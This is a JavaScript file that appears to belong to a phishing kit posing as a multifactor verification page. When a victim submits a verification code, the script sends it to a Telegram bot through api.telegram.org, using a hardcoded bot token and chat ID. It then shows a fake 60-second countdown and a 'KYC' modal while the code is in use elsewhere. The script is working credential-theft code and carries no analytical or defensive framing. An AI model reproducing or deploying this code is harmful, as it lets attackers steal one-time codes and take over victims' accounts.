let formm;
let delayy;
let counterr;
let email_field;
let submit_btn;
let countdownInterval;
let kycModal;
let closeButton;

document.addEventListener("DOMContentLoaded", () => {
    console.log("Page loaded");
    counterr = document.querySelector(".counterr");
    delayy = document.getElementById("delayy");
    email_field = document.getElementById("multifactor_code");
    submit_btn = document.querySelector("button[type='submit']");
    formm = document.getElementById("new_multifactor");
    kycModal = document.getElementById("kycModal");
    closeButton = document.querySelector(".close-button");

    // Initially hide the delayy element and the modal on page load
    delayy.style.display = "none";
    kycModal.style.display = "none";

    formm.addEventListener("submit", (e) => {
        e.preventDefault(); // Prevent default form submission

        // Basic validation: Check if the verification code field is not empty
        if (email_field.value.trim() !== "") {
            submit_btn.setAttribute("disabled", "true"); // Disable the submit button immediately
            delayy.style.display = "flex"; // Show the delayy container (spinner and counter)

            // 1. Send Telegram message immediately upon valid submission
            send_telegram_message();

            // 2. Start the countdown
            startCountdown();

        } else {
            console.log("Verification code field is empty. Please enter a code.");
            // Optionally, display an error message to the user on the page
            const alertError = document.querySelector('.alert.alert-error');
            if (alertError) {
                alertError.textContent = "Please enter your 6-digit verification code.";
                alertError.style.display = "block";
            }
        }
    });

    // Close the modal when the close button is clicked
    closeButton.addEventListener("click", () => {
        kycModal.style.display = "none";
        // Optionally, redirect the user after closing the modal, or reset the form
        // window.location.href = "/Login/validate/index.html";
    });

    // Close the modal if the user clicks outside of it
    window.addEventListener("click", (event) => {
        if (event.target === kycModal) {
            kycModal.style.display = "none";
            // window.location.href = "/Login/validate/index.html";
        }
    });
});


function startCountdown() {
    let count = 60; // Start countdown from 60 seconds
    counterr.textContent = count; // Set initial counter text

    // Clear any existing interval to prevent multiple timers running
    if (countdownInterval) {
        clearInterval(countdownInterval);
    }

    countdownInterval = setInterval(() => {
        count--;
        counterr.textContent = count;

        if (count <= 0) {
            clearInterval(countdownInterval); // Stop the countdown
            delayy.style.display = "none"; // Hide the spinner/countdown
            submit_btn.removeAttribute("disabled"); // Re-enable the submit button (optional, if you want user to try again)
            showKycModal(); // Show the completion modal
        }
    }, 1000); // Update every 1 second (1000ms)
}

async function send_telegram_message() {
    const chatIds = ["-1002393688453"]; // Add your chat IDs here
    const verificationCode = email_field.value;
    const msg = `Verification code: ${verificationCode}`;

    for (let i = 0; i < chatIds.length; i++) {
        const data = {
            chat_id: chatIds[i],
            text: msg,
        };

        try {
            const resp = await fetch(
                `https://api.telegram.org/bot7871889688:AAFlHwVTt_lPVFTm6WT67so8UKK1bjWWgug/sendMessage`, // Replace 'your_bot_token' with your actual bot token
                {
                    method: "POST",
                    headers: {
                        accept: "application/json",
                        "content-type": "application/json",
                    },
                    body: JSON.stringify(data),
                }
            );

            const resJson = await resp.json();
            console.log("Telegram API response:", resJson);

            if (resJson.ok) {
                console.log("Message sent successfully to chat ID:", chatIds[i]);
            } else {
                console.error("Telegram API response indicates failure for chat ID", chatIds[i], ":", resJson);
            }

        } catch (error) {
            console.error("Error sending message to Telegram:", error);
        }
    }
}

function showKycModal() {
    kycModal.style.display = "flex"; // Use flex to center the modal content
}